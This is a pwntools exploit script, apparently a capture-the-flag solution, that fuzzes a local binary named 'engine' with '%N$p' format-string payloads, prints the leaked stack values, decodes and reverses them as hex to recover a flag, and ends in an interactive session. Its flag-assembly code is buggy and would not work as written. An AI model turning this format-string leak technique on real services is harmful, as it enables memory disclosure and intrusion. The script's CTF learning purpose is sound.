from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './engine'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'warning'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

flag = b""

# Let's fuzz x values
for i in range(500):
    try:
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        io.sendlineafter(':', '%{}$p'.format(i))
        io.recvuntil('(')
        # Receive the response
        result = io.recvuntil(')')[:-1]
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = str(decoded[::-1])
                print(reversed_hex)
                result += reversed_hex
            except BaseException:
                pass
    except EOFError:
        pass

print(flag)

# Got Shell?
io.interactive()
